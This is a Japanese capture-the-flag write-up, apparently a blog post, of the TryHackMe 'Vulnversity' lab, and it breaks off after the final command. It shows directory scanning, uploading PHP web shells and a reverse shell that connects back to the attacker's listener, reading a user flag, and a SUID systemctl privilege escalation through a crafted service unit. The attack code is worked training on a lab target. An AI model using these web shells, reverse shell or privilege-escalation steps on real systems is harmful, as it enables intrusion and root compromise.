+ftp: Can't bind for data connection: アドレスは既に使用中です
+ftp&gt; bye
+221 Goodbye.
+
+┌──(rkametani㉿rkametani-1-kalija)-[~]
+└─$ 
+
+</code></pre>
+<p>ftpサービスが動いていたので空白パスワードでログインできないか試行したが失敗した</p>
+<p>3333番ポートでapacheが動いているらしいのでディレクトリを探してみる</p>
+<pre><code class="language-bash">┌──(rkametani㉿rkametani-1-kalija)-[~]
+└─$ feroxbuster -u http://10.48.179.41:3333
+
+</code></pre>
+<p>100件ほどヒットしたが多くはfontやcssやimageに関するディレクトリであった<br>
+怪しいものをいくつか挙げる</p>
+<pre><code class="language-bash">301      GET        9l       28w      330c http://10.48.179.41:3333/internal/uploads
+301      GET        9l       28w      322c http://10.48.179.41:3333/internal
+200      GET        1l        1w      688c http://10.48.179.41:3333/fonts/flaticon/backup.txt
+</code></pre>
+<p>いちばん気になるbackup.txtから見てみる</p>
+<pre><code class="language-bash">┌──(rkametani㉿rkametani-1-kalija)-[~]
+└─$ curl http://10.48.179.41:3333/fonts/flaticon/backup.txt   
+eyIxIjp7IklEIjoxLCJuYW1lIjoiTXkgaWNvbnMgY29sbGVjdGlvbiIsImJvb2ttYXJrX2lkIjoiZHpvejQ5Z2pvNjAwMDAwMCIsImNyZWF0ZWQiOm51bGwsInVwZGF0ZWQiOjE1MzQ3MjkwODUsImFjdGl2ZSI6MSwic291cmNlIjoibG9jYWwiLCJvcmRlciI6MCwiY29sb3IiOiIwMDAwMDAiLCJzdGF0dXMiOjF9LCJkem96NDlnam82MDAwMDAwIjpbeyJpZCI6MTgyMzMwLCJ0ZWFtIjowLCJuYW1lIjoiZXhhbSIsImNvbG9yIjoiIzAwMDAwMCIsInByZW1pdW0iOjAsInNvcnQiOjJ9LHsiaWQiOjE4MjMxOSwidGVhbSI6MCwibmFtZSI6ImJsYWNrYm9hcmQiLCJjb2xvciI6IiMwMDAwMDAiLCJwcmVtaXVtIjowLCJzb3J0IjozfSx7ImlkIjoxODIzMjIsInRlYW0iOjAsIm5hbWUiOiJib29rcyIsImNvbG9yIjoiIzAwMDAwMCIsInByZW1pdW0iOjAsInNvcnQiOjR9LHsiaWQiOjE4MjMzNiwidGVhbSI6MCwibmFtZSI6InVuaXZlcnNpdHkiLCJjb2xvciI6IiMwMDAwMDAiLCJwcmVtaXVtIjowLCJzb3J0IjoxfV19                                                                                                                                          
+┌──(rkametani㉿rkametani-1-kalija)-[~]
+└─$ 
+
+</code></pre>
+<p>サービスの認証キーかなあ</p>
+<p>つぎにinternalを見に行く<br>
+<img alt="Pasted image 20260424111920" src="vulnversity/images/01-Pasted-image-20260424111920.png"><br>
+ファイルを提出できるようだ</p>
+<p>つぎにinternal/uploadsを見に行く<br>
+<img alt="Pasted image 20260424112006" src="vulnversity/images/02-Pasted-image-20260424112006.png"><br>
+おそらく過去にアップロードされたであろうファイルを発見した<br>
+shell.phtmlというファイル名からなにかの実行ファイルであろうか<br>
+これをブラウザではなくcurlから見るにはなんてうったらいいんだろう</p>
+<p>geminiに教えてもらった！</p>
+<pre><code class="language-bash">┌──(rkametani㉿rkametani-1-kalija)-[~]
+└─$ curl http://10.48.179.41:3333/internal/uploads            
+&lt;!DOCTYPE HTML PUBLIC &quot;-//IETF//DTD HTML 2.0//EN&quot;&gt;
+&lt;html&gt;&lt;head&gt;
+&lt;title&gt;301 Moved Permanently&lt;/title&gt;
+&lt;/head&gt;&lt;body&gt;
+&lt;h1&gt;Moved Permanently&lt;/h1&gt;
+&lt;p&gt;The document has moved &lt;a href=&quot;http://10.48.179.41:3333/internal/uploads/&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;
+&lt;hr&gt;
+&lt;address&gt;Apache/2.4.41 (Ubuntu) Server at 10.48.179.41 Port 3333&lt;/address&gt;
+&lt;/body&gt;&lt;/html&gt;
+
+┌──(rkametani㉿rkametani-1-kalija)-[~]
+└─$ 
+</code></pre>
+<p>この場合にはリダイレクトの指示にしたがわずその案内画面を表示してしまっているため<br>
+末尾に<code>/</code>をつけるかリダイレクトを自動で追いかけるオプション<code>-L</code>を使う</p>
+<pre><code class="language-bash">┌──(rkametani㉿rkametani-1-kalija)-[~]
+└─$ curl http://10.48.179.41:3333/internal/uploads/           
+&lt;!DOCTYPE HTML PUBLIC &quot;-//W3C//DTD HTML 3.2 Final//EN&quot;&gt;
+&lt;html&gt;
+ &lt;head&gt;
+  &lt;title&gt;Index of /internal/uploads&lt;/title&gt;
+ &lt;/head&gt;
+ &lt;body&gt;
+&lt;h1&gt;Index of /internal/uploads&lt;/h1&gt;
+  &lt;table&gt;
+   &lt;tr&gt;&lt;th valign=&quot;top&quot;&gt;&lt;img src=&quot;/icons/blank.gif&quot; alt=&quot;[ICO]&quot;&gt;&lt;/th&gt;&lt;th&gt;&lt;a href=&quot;?C=N;O=D&quot;&gt;Name&lt;/a&gt;&lt;/th&gt;&lt;th&gt;&lt;a href=&quot;?C=M;O=A&quot;&gt;Last modified&lt;/a&gt;&lt;/th&gt;&lt;th&gt;&lt;a href=&quot;?C=S;O=A&quot;&gt;Size&lt;/a&gt;&lt;/th&gt;&lt;th&gt;&lt;a href=&quot;?C=D;O=A&quot;&gt;Description&lt;/a&gt;&lt;/th&gt;&lt;/tr&gt;
+   &lt;tr&gt;&lt;th colspan=&quot;5&quot;&gt;&lt;hr&gt;&lt;/th&gt;&lt;/tr&gt;
+&lt;tr&gt;&lt;td valign=&quot;top&quot;&gt;&lt;img src=&quot;/icons/back.gif&quot; alt=&quot;[PARENTDIR]&quot;&gt;&lt;/td&gt;&lt;td&gt;&lt;a href=&quot;/internal/&quot;&gt;Parent Directory&lt;/a&gt;&lt;/td&gt;&lt;td&gt;&amp;nbsp;&lt;/td&gt;&lt;td align=&quot;right&quot;&gt;  - &lt;/td&gt;&lt;td&gt;&amp;nbsp;&lt;/td&gt;&lt;/tr&gt;
+&lt;tr&gt;&lt;td valign=&quot;top&quot;&gt;&lt;img src=&quot;/icons/unknown.gif&quot; alt=&quot;[   ]&quot;&gt;&lt;/td&gt;&lt;td&gt;&lt;a href=&quot;shell.phtml&quot;&gt;shell.phtml&lt;/a&gt;&lt;/td&gt;&lt;td align=&quot;right&quot;&gt;2025-06-12 15:01  &lt;/td&gt;&lt;td align=&quot;right&quot;&gt;5.4K&lt;/td&gt;&lt;td&gt;&amp;nbsp;&lt;/td&gt;&lt;/tr&gt;
+   &lt;tr&gt;&lt;th colspan=&quot;5&quot;&gt;&lt;hr&gt;&lt;/th&gt;&lt;/tr&gt;
+&lt;/table&gt;
+&lt;address&gt;Apache/2.4.41 (Ubuntu) Server at 10.48.179.41 Port 3333&lt;/address&gt;
+&lt;/body&gt;&lt;/html&gt;
+
+┌──(rkametani㉿rkametani-1-kalija)-[~]
+└─$ 
+
+</code></pre>
+<p>すごい。ちゃんとスラッシュつけただけで見えるようになった</p>
+<p>つぎに見つけた怪しいファイルを見てみる</p>
+<pre><code class="language-bash">┌──(rkametani㉿rkametani-1-kalija)-[~]
+└─$ curl http://10.48.179.41:3333/internal/uploads/shell.phtml 
+WARNING: Failed to daemonise.  This is quite common and not fatal.
+Connection timed out (110)
+
+┌──(rkametani㉿rkametani-1-kalija)-[~]
+</code></pre>
+<p>数十秒待機したのち、ワーニングが出てタイムアウトされた<br>
+コードが見れると思ったけど実行されてる？</p>
+<p><code>-v</code>オプションをつけると通信のどの段階で止まっているのか見れるらしい</p>
+<pre><code class="language-bash">┌──(rkametani㉿rkametani-1-kalija)-[~]
+└─$ curl http://10.48.179.41:3333/internal/uploads/shell.phtml -v
+*   Trying 10.48.179.41:3333...
+* Established connection to 10.48.179.41 (10.48.179.41 port 3333) from 192.168.205.211 port 59486 
+* using HTTP/1.x
+&gt; GET /internal/uploads/shell.phtml HTTP/1.1
+&gt; Host: 10.48.179.41:3333
+&gt; User-Agent: curl/8.19.0
+&gt; Accept: */*
+&gt; 
+* Request completely sent off
+&lt; HTTP/1.1 200 OK
+&lt; Date: Fri, 24 Apr 2026 02:26:52 GMT
+&lt; Server: Apache/2.4.41 (Ubuntu)
+&lt; Vary: Accept-Encoding
+&lt; Content-Length: 94
+&lt; Content-Type: text/html; charset=UTF-8
+&lt; 
+WARNING: Failed to daemonise.  This is quite common and not fatal.
+Connection timed out (110)
+* Connection #0 to host 10.48.179.41:3333 left intact
+
+┌──(rkametani㉿rkametani-1-kalija)-[~]
+└─$ 
+
+</code></pre>
+<p>よくわからんので<code>-o</code>で手元に保存してcatしてみる</p>
+<pre><code class="language-bash">┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/vulnversity]
+└─$ curl http://10.48.179.41:3333/internal/uploads/shell.phtml -o shell    
+  % Total    % Received % Xferd  Average Speed  Time    Time    Time   Current
+                                 Dload  Upload  Total   Spent   Left   Speed
+100     94 100     94   0      0      3      0   00:31   00:30   00:01     18
+
+┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/vulnversity]
+└─$ ls
+shell
+
+┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/vulnversity]
+└─$ ll
+合計 4
+-rw-rw-r-- 1 rkametani rkametani 94  4月 24 11:32 shell
+
+┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/vulnversity]
+└─$ cat shell                                                          
+WARNING: Failed to daemonise.  This is quite common and not fatal.
+Connection timed out (110)
+
+┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/vulnversity]
+└─$ 
+
+</code></pre>
+<p>うまくいかず。<br>
+そもそもcurl -oは実行したあとに保存するので、今回も同様に実行されてそのエラー文が出た形になったらしい</p>
+<p>つぎの試みとして自分で作ったリバースシェルをアップロードできないか試す</p>
+<pre><code class="language-bash">┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/vulnversity]
+└─$ vim revshell.phtml
+
+┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/vulnversity]
+└─$ cat revshell.phtml                                               
+&lt;?php
+// IPとPORTを自分の環境に合わせて書き換える
+$ip = '192.168.205.211'; 
+$port = 4444;
+
+$sol=proc_open('/bin/sh -i', array(0 =&gt; array('pipe', 'r'), 1 =&gt; array('pipe', 'w'), 2 =&gt; array('pipe', 'w')), $pipes);
+if (is_resource($sol)) {
+    while (!feof($pipes[1])) echo fread($pipes[1], 1024);
+    while (!feof($pipes[2])) echo fread($pipes[2], 1024);
+}
+?&gt;
+
+┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/vulnversity]
+└─$ 
+
+</code></pre>
+<p>まずコードを作る</p>
+<pre><code class="language-bash">┌──(rkametani㉿rkametani-1-kalija)-[~]
+└─$ nc -lvnp 4444                      
+listening on [any] 4444 ...
+
+
+</code></pre>
+<p>listenポートを開ける</p>
+<pre><code class="language-bash">┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/vulnversity]
+└─$ curl http://10.48.179.41:3333/internal/uploads/                    
+&lt;!DOCTYPE HTML PUBLIC &quot;-//W3C//DTD HTML 3.2 Final//EN&quot;&gt;
+&lt;html&gt;
+ &lt;head&gt;
+  &lt;title&gt;Index of /internal/uploads&lt;/title&gt;
+ &lt;/head&gt;
+ &lt;body&gt;
+&lt;h1&gt;Index of /internal/uploads&lt;/h1&gt;
+  &lt;table&gt;
+   &lt;tr&gt;&lt;th valign=&quot;top&quot;&gt;&lt;img src=&quot;/icons/blank.gif&quot; alt=&quot;[ICO]&quot;&gt;&lt;/th&gt;&lt;th&gt;&lt;a href=&quot;?C=N;O=D&quot;&gt;Name&lt;/a&gt;&lt;/th&gt;&lt;th&gt;&lt;a href=&quot;?C=M;O=A&quot;&gt;Last modified&lt;/a&gt;&lt;/th&gt;&lt;th&gt;&lt;a href=&quot;?C=S;O=A&quot;&gt;Size&lt;/a&gt;&lt;/th&gt;&lt;th&gt;&lt;a href=&quot;?C=D;O=A&quot;&gt;Description&lt;/a&gt;&lt;/th&gt;&lt;/tr&gt;
+   &lt;tr&gt;&lt;th colspan=&quot;5&quot;&gt;&lt;hr&gt;&lt;/th&gt;&lt;/tr&gt;
+&lt;tr&gt;&lt;td valign=&quot;top&quot;&gt;&lt;img src=&quot;/icons/back.gif&quot; alt=&quot;[PARENTDIR]&quot;&gt;&lt;/td&gt;&lt;td&gt;&lt;a href=&quot;/internal/&quot;&gt;Parent Directory&lt;/a&gt;&lt;/td&gt;&lt;td&gt;&amp;nbsp;&lt;/td&gt;&lt;td align=&quot;right&quot;&gt;  - &lt;/td&gt;&lt;td&gt;&amp;nbsp;&lt;/td&gt;&lt;/tr&gt;
+&lt;tr&gt;&lt;td valign=&quot;top&quot;&gt;&lt;img src=&quot;/icons/unknown.gif&quot; alt=&quot;[   ]&quot;&gt;&lt;/td&gt;&lt;td&gt;&lt;a href=&quot;revshell.phtml&quot;&gt;revshell.phtml&lt;/a&gt;&lt;/td&gt;&lt;td align=&quot;right&quot;&gt;2026-04-23 22:39  &lt;/td&gt;&lt;td align=&quot;right&quot;&gt;374 &lt;/td&gt;&lt;td&gt;&amp;nbsp;&lt;/td&gt;&lt;/tr&gt;
+&lt;tr&gt;&lt;td valign=&quot;top&quot;&gt;&lt;img src=&quot;/icons/unknown.gif&quot; alt=&quot;[   ]&quot;&gt;&lt;/td&gt;&lt;td&gt;&lt;a href=&quot;shell.phtml&quot;&gt;shell.phtml&lt;/a&gt;&lt;/td&gt;&lt;td align=&quot;right&quot;&gt;2025-06-12 15:01  &lt;/td&gt;&lt;td align=&quot;right&quot;&gt;5.4K&lt;/td&gt;&lt;td&gt;&amp;nbsp;&lt;/td&gt;&lt;/tr&gt;
+   &lt;tr&gt;&lt;th colspan=&quot;5&quot;&gt;&lt;hr&gt;&lt;/th&gt;&lt;/tr&gt;
+&lt;/table&gt;
+&lt;address&gt;Apache/2.4.41 (Ubuntu) Server at 10.48.179.41 Port 3333&lt;/address&gt;
+&lt;/body&gt;&lt;/html&gt;
+
+┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/vulnversity]
+└─$ 
+
+</code></pre>
+<p>ブラウザからアップロードしてcurlコマンドで反映されているかを確認する</p>
+<pre><code class="language-bash">┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/vulnversity]
+└─$ curl http://10.48.179.41:3333/internal/uploads/revshell.phtmp -v  
+</code></pre>
+<p><code>-v</code>で詳細を追いつつ、アップロードしたシェルを実行してみる</p>
+<pre><code class="language-bash">┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/vulnversity]
+└─$ curl http://10.48.179.41:3333/internal/uploads/revshell.phtml -v
+*   Trying 10.48.179.41:3333...
+* Established connection to 10.48.179.41 (10.48.179.41 port 3333) from 192.168.205.211 port 60354 
+* using HTTP/1.x
+&gt; GET /internal/uploads/revshell.phtml HTTP/1.1
+&gt; Host: 10.48.179.41:3333
+&gt; User-Agent: curl/8.19.0
+&gt; Accept: */*
+&gt; 
+* Request completely sent off
+^C
+
+┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/vulnversity]
+└─$
+
+</code></pre>
+<p>かたまって反応がない<br>
+listenポートのほうにも変化がない</p>
+<p>試しにより簡単なシェルをアップロードして機能するか試す</p>
+<pre><code class="language-bash">┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/vulnversity]
+└─$ curl http://10.48.179.41:3333/internal/uploads/test.phtml -v
+*   Trying 10.48.179.41:3333...
+* Established connection to 10.48.179.41 (10.48.179.41 port 3333) from 192.168.205.211 port 40174 
+* using HTTP/1.x
+&gt; GET /internal/uploads/test.phtml HTTP/1.1
+&gt; Host: 10.48.179.41:3333
+&gt; User-Agent: curl/8.19.0
+&gt; Accept: */*
+&gt; 
+* Request completely sent off
+&lt; HTTP/1.1 200 OK
+&lt; Date: Fri, 24 Apr 2026 02:53:31 GMT
+&lt; Server: Apache/2.4.41 (Ubuntu)
+&lt; Content-Length: 54
+&lt; Content-Type: text/html; charset=UTF-8
+&lt; 
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+* Connection #0 to host 10.48.179.41:3333 left intact
+
+┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/vulnversity]
+└─$ 
+
+</code></pre>
+<p><code>id</code>コマンドが実行できていることからRCE自体は成功していることが分かる</p>
+<p>別のshellを送って情報が取れないか試してみる</p>
+<pre><code class="language-php">&lt;?php echo &quot;&lt;pre&gt;&quot; . shell_exec($_GET['cmd']) . &quot;&lt;/pre&gt;&quot;; ?&gt;
+</code></pre>
+<p>これは任意のコードをcurlコマンドの末尾につけて実行できるRCEのシェルコードだ</p>
+<pre><code class="language-bash">┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/vulnversity]
+└─$ curl http://10.48.179.41:3333/internal/uploads/webshell.phtml?cmd=whoami
+&lt;pre&gt;www-data
+&lt;/pre&gt;      
+┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/vulnversity]
+└─$ curl http://10.48.151.177:3333/internal/uploads/webshell.phtml?cmd=pwd
+&lt;pre&gt;/var/www/html/internal/uploads
+&lt;/pre&gt;                                                                                                                                          
+┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/vulnversity]
+└─$ curl http://10.48.151.177:3333/internal/uploads/webshell.phtml?cmd=ls 
+&lt;pre&gt;shell.phtml
+webshell.phtml
+&lt;/pre&gt;                                                                                                                                          
+┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/vulnversity]
+└─$ curl http://10.48.151.177:3333/internal/uploads/webshell.phtml?cmd=ls+-la
+&lt;pre&gt;total 20
+drwxr-xr-x 2 www-data www-data 4096 Apr 24 00:06 .
+drwxr-xr-x 4 www-data www-data 4096 Jul 31  2019 ..
+-rw-r--r-- 1 www-data www-data 5495 Jun 12  2025 shell.phtml
+-rw-r--r-- 1 www-data www-data   61 Apr 24 00:06 webshell.phtml
+&lt;/pre&gt;   
+
+</code></pre>
+<p>途中で昼休憩を挟んだためipアドレスが変わっている<br>
+どうやってflagを探そう</p>
+<pre><code class="language-bash">/snap/core20/2582/usr/lib/python3.9/lib2to3/PatternGrammar.txt
+/snap/core20/2582/usr/share/doc/mount/mount.txt
+/snap/core20/2582/usr/share/subiquity/subiquity-0.0.5.egg-info/dependency_links.txt
+/snap/core20/2582/usr/share/subiquity/subiquity-0.0.5.egg-info/entry_points.txt
+/snap/core20/2582/usr/share/subiquity/subiquity-0.0.5.egg-info/top_level.txt
+/snap/core20/2582/usr/share/vim/vim81/doc/help.txt
+/home/bill/user.txt
+&lt;/pre&gt;                                                                                                                                          
+┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/vulnversity]
+└─$ curl http://10.48.151.177:3333/internal/uploads/webshell.phtml?cmd=find+/+-name+*.txt | wc -l
+  % Total    % Received % Xferd  Average Speed  Time    Time    Time   Current
+                                 Dload  Upload  Total   Spent   Left   Speed
+100  57562   0  57562   0      0  38116      0           00:01          38123
+1102
+
+┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/vulnversity]
+└─$ 
+
+</code></pre>
+<p>すごく大量にヒットした<br>
+1102個見つかった！<br>
+一番下にuser.txtがあったのできっとこれだろう<br>
+shellに投げたコマンドは<code>find / -name *.txt</code>である</p>
+<pre><code class="language-bash">┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/vulnversity]
+└─$ curl http://10.48.151.177:3333/internal/uploads/webshell.phtml?cmd=cat+/home/bill/user.txt   
+&lt;pre&gt;8bd7992fbe8a6ad22a63361004cfcedb
+&lt;/pre&gt;                                                                                                                                          
+┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/vulnversity]
+└─$ 
+
+</code></pre>
+<p><img alt="Pasted image 20260424131805" src="vulnversity/images/03-Pasted-image-20260424131805.png"><br>
+通った！！<br>
+けどなんかこれ小問構成だったらしい！！！！<br>
+まじかよ！！！</p>
+<p>宮澤さんに聞いたら「リバースシェルのほうも出来るはずです」とのことだったので</p>
+<pre><code class="language-bash">┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/vulnversity]
+└─$ sudo apt install webshells   
+</code></pre>
+<p>webshellsを改めてインストールしてその中には入っているものを試すことにした</p>
+<pre><code class="language-bash">┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/vulnversity]
+└─$ cp /usr/share/webshells/php/php-reverse-shell.php ./myshell.phtml
+
+┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/vulnversity]
+└─$ vim myshell.phtml 
+
+┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/vulnversity]
+└─$ curl http://10.48.151.177:3333/internal/uploads/myshell.phtml 
+</code></pre>
+<pre><code class="language-bash">┌──(rkametani㉿rkametani-1-kalija)-[~]
+└─$ nc -lvnp 4444     
+listening on [any] 4444 ...
+connect to [192.168.205.211] from (UNKNOWN) [10.48.151.177] 42324
+Linux ip-10-48-151-177 5.15.0-139-generic #149~20.04.1-Ubuntu SMP Wed Apr 16 08:29:56 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux
+ 00:28:59 up 26 min,  0 users,  load average: 0.00, 0.00, 0.05
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$ whoami
+www-data
+$ pwd
+/
+
+</code></pre>
+<p>いけたみたいです</p>
+<pre><code class="language-sh">$ find / -name user.txt 2&gt;/dev/null
+/home/bill/user.txt
+$  
+</code></pre>
+<p><code>2&gt;/dev/null</code>を入れないと<code>permission denied</code>の行が大量ヒットしてウザいです</p>
+<hr>
+<p>そういえば元々入っていたが動かなかったshell.phtmlの中身もcatで見ることができた</p>
+<pre><code class="language-bash">┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/vulnversity]
+└─$ curl http://10.48.151.177:3333/internal/uploads/webshell.phtml?cmd=cat+shell.phtml        
+&lt;pre&gt;&lt;?php
+// php-reverse-shell - A Reverse Shell implementation in PHP
+// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
+//
+// This tool may be used for legal purposes only.  Users take full responsibility
+// for any actions performed using this tool.  The author accepts no liability
+// for damage caused by this tool.  If these terms are not acceptable to you, then
+// do not use this tool.
+//
+// In all other respects the GPL version 2 applies:
+//
+// This program is free software; you can redistribute it and/or modify
+// it under the terms of the GNU General Public License version 2 as
+// published by the Free Software Foundation.
+//
+// This program is distributed in the hope that it will be useful,
+// but WITHOUT ANY WARRANTY; without even the implied warranty of
+// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+// GNU General Public License for more details.
+//
+// You should have received a copy of the GNU General Public License along
+// with this program; if not, write to the Free Software Foundation, Inc.,
+// 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
+//
+</code></pre>
+<p>webshellsに入っているphpのリバーシェルのコードと同一のものであった<br>
+ただ起動しなかったのはLHOSTSが異なるものだったから</p>
+<hr>
+<p><code>user.txt</code>を取得できたのでつぎは権限昇格を目指す<br>
+SUID持ちを探そう<br>
+なんだっけコマンド</p>
+<pre><code class="language-bash">$ find / -perm -4000 2&gt;/dev/null
+/usr/bin/newuidmap
+/usr/bin/chfn
+/usr/bin/newgidmap
+/usr/bin/sudo
+/usr/bin/chsh
+/usr/bin/passwd
+/usr/bin/pkexec
+/usr/bin/newgrp
+/usr/bin/gpasswd
+/usr/bin/at
+/usr/lib/snapd/snap-confine
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/openssh/ssh-keysign
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+/bin/su
+/bin/mount
+/bin/umount
+/bin/systemctl
+/bin/fusermount
+/snap/snapd/24505/usr/lib/snapd/snap-confine
+/snap/core20/2582/usr/bin/chfn
+/snap/core20/2582/usr/bin/chsh
+/snap/core20/2582/usr/bin/gpasswd
+/snap/core20/2582/usr/bin/mount
+/snap/core20/2582/usr/bin/newgrp
+/snap/core20/2582/usr/bin/passwd
+/snap/core20/2582/usr/bin/su
+/snap/core20/2582/usr/bin/sudo
+/snap/core20/2582/usr/bin/umount
+/snap/core20/2582/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/snap/core20/2582/usr/lib/openssh/ssh-keysign
+/sbin/mount.cifs
+$ 
+</code></pre>
+<p>できた。<br>
+けどここから怪しいものなんてわかりませーん！</p>
+<hr>
+<blockquote>
+<p>[!tip] 権限昇格を狙っているときにSUIDのついたファイルを列挙できたとして、なにを考えて各ファイルを怪しいか怪しくないか判断すればよいの<br>
+SUIDファイルを列挙した後の判断基準について、以下の観点で考えます。</p>
+<ol>
+<li>
+<p>まず「正常なSUIDバイナリ」を除外する<br>
+Linuxには設計上SUIDが必要な標準バイナリが存在します。これらは基本的に（既知のCVEがない限り）無視してよい対象です。<br>
+代表例：<code>/bin/su</code>, <code>/bin/mount</code>, <code>/bin/umount</code>, <code>/bin/ping</code>, <code>/usr/bin/passwd</code>, <code>/usr/bin/chsh</code>, <code>/usr/bin/chfn</code>, <code>/usr/bin/newgrp</code>, <code>/usr/bin/gpasswd</code>, <code>/usr/bin/sudo</code>, <code>/usr/bin/pkexec</code>（※pkexecはCVE-2021-4034 PwnKitで有名なので必ずバージョン確認）</p>
+</li>
+<li>
+<p>GTFOBinsに載っているか確認する<br>
+これが最重要の判断軸です。<code>gtfobins.github.io</code> にはSUIDで悪用可能なバイナリと具体的な悪用手法が網羅されています。列挙したバイナリ名をGTFOBinsで検索し「SUID」セクションがあれば即悪用候補です。<br>
+例：<code>find</code>, <code>nmap</code>(古いバージョン), <code>vim</code>, <code>nano</code>, <code>less</code>, <code>more</code>, <code>awk</code>, <code>python</code>, <code>perl</code>, <code>ruby</code>, <code>bash</code>, <code>cp</code>, <code>mv</code>, <code>tar</code>, <code>zip</code>, <code>env</code> などがSUIDで見つかったら当たりです。</p>
+</li>
+<li>
+<p>「見慣れないバイナリ」を怪しむ<br>
+以下のパターンは特に疑う価値があります。<br>
+- <code>/usr/local/bin/</code>, <code>/opt/</code>, <code>/home/*/</code> にある独自バイナリ（管理者が自作したスクリプトやツール）<br>
+- パッケージマネージャで入らない非標準のパス<br>
+- 名前から用途が推測できないバイナリ<br>
+これらは <code>file</code>, <code>strings</code>, <code>ltrace</code>, <code>strace</code> で挙動を調べる価値があります。特に <code>strings</code> で相対パス呼び出し（<code>system("service ...")</code> のような）が見えたらPATHハイジャックの余地があります。</p>
+</li>
+<li>
+<p>カスタムバイナリの分析観点<br>
+独自のSUIDバイナリを見つけたら以下をチェックします。<br>
+- <strong>相対パスでコマンド実行しているか</strong>（<code>system("ls")</code>など）→ PATH注入<br>
+- <strong>引数をそのままシェルに渡しているか</strong> → コマンドインジェクション<br>
+- <strong>環境変数を信頼しているか</strong>（<code>LD_PRELOAD</code>は通常SUIDでは無効だが、<code>LD_LIBRARY_PATH</code>や独自環境変数の扱いに穴がある場合あり）<br>
+- <strong>設定ファイルやライブラリを書き込み可能な場所から読んでいるか</strong></p>
+</li>
+<li>
+<p>バージョン番号を確認する</p>
+</li>
+</ol>
+<p>標準バイナリでもバージョンが古ければCVEが刺さります。<code>--version</code> で確認し、pkexec, sudo(Baron Samedit CVE-2021-3156), screen などは定番です。</p>
+<p>実務的なフロー</p>
+<p>列挙結果を眺めて、まず頭の中で「標準SUID」を消去し、残った中で GTFOBins ヒット品と見慣れないバイナリを優先的に掘る、という順序が効率的です。</p>
+</blockquote>
+<p>わかったかな？</p>
+<hr>
+<p>今回のケースではsystemctlがそれにあたる<br>
+サーバの防護で無限に使ったよねこれ<br>
+systemctlは普段の運用ではos上のサービス（デーモン）の管理によく使われます<br>
+apacheやsshなどを立ち上げたりなど。<br>
+なのでこれは普通に考えてroot権限でしか動かせないようにしているはず<br>
+なのにSUIDが割り当てられているということは一般ユーザーも実行できる状況になっているということ<br>
+これはセキュリティ上の異常であり、本問における脆弱性である<br>
+ということでGTFOBinsでsystemctlを探す</p>
+<p>GTFObinsでは以下が見つかった</p>
+<pre><code class="language-bash">echo '[Service]
+Type=oneshot
+ExecStart=/path/to/command
+[Install]
+WantedBy=multi-user.target' &gt;/path/to/temp-file.service
+systemctl link /path/to/temp-file.service
+systemctl enable --now /path/to/temp-file.service
+</code></pre>
+<p>これは3つに手順を分けられる<br>
+まず任意コマンド<code>/path/to/command</code>を実行するというサービスを作ってtemp-file.serviceという名前で保存する<br>
+その実体をsystemctlに結びつける<br>
+最後にenableすることでroot権限で任意コマンドが実行されるというわけ</p>
+<p>GTFOBinsで物を見つけて実行にもっていけることが大事なので<br>
+コードの中身を完全に理解する必要はない</p>
+<p>今回は任意コマンドを<code>cat /root/root.txt &gt; /tmp/output.txt</code>とした<br>
+enableしたあとはここにいけばファイルが見つかるかもしれない</p>
+<pre><code class="language-bash">$ echo '[Service]
+Type=oneshot
+ExecStart=/bin/sh -c &quot;cat /root/root.txt &gt; /tmp/output.txt&quot;
+[Install]
+WantedBy=multi-user.target' &gt; /tmp/pwn.service&gt; &gt; &gt; &gt; 
+$ ls /tmp
+pwn.service
+snap-private-tmp
+systemd-private-6d759b8cbd524860a9100278c1a7fb5e-systemd-logind.service-EqdQUf
+systemd-private-6d759b8cbd524860a9100278c1a7fb5e-systemd-resolved.service-eYlmph
+systemd-private-6d759b8cbd524860a9100278c1a7fb5e-systemd-timesyncd.service-FzlXSe
+$ cat pwn.service
+cat: pwn.service: No such file or directory
+$ cat /tmp/pwn.service
+[Service]
+Type=oneshot
+ExecStart=/bin/sh -c &quot;cat /root/root.txt &gt; /tmp/output.txt&quot;
+[Install]
+WantedBy=multi-user.target
+$ /bin/systemctl link /tmp/pwn.service
+Created symlink /etc/systemd/system/pwn.service -&gt; /tmp/pwn.service.
+$ /bin/systemctl enable --now /tmp/pwn.service
